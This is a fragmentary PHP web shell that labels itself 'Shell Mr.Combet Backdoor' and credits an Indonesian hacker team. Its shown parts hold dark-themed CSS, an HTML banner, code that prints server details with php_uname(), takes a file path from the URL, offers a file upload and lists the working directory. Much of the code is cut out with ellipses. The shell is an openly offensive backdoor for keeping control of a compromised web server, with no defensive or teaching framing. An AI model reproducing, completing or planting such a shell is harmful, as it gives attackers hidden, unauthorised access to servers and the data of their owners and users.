...
//Shell Mr.Combet Backdoor
//Redesign By Mr.Combet
//
...
body {
  ...
  background:#000000;color:#000000;font-size: medium;line-height: 1;font-family: Kelly Slab ;
...
input, textarea { font-family: Kelly Slab;margin-top: 3px;margin-bottom: 3px; }
...
.td_home { padding: 7px; }
select {font-family: Kelly Slab; }
a {color:white;text-decoration: none;}
textarea { width: 100%;height: 400px;padding: 4px; }
</style>
<style>
...
echo '</head>
<body><b>
<H1><center> &#11088; <font color="red">Mr.Combet</font> <font color="white">Shell</font> &#11088; </center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">

<tr><td>

<font color="lime"><center>'.php_uname().'</center></font><br>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 
...
echo '<font color="lime">File Upload</font><br />';
}else{
...
$pa = getcwd();
echo ' </b><table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
...
echo '<br><center>&#11088; One Hat Cyber Team &#11088;<br>All Indonesian Hackers</body>
</html>';
function perms($file){
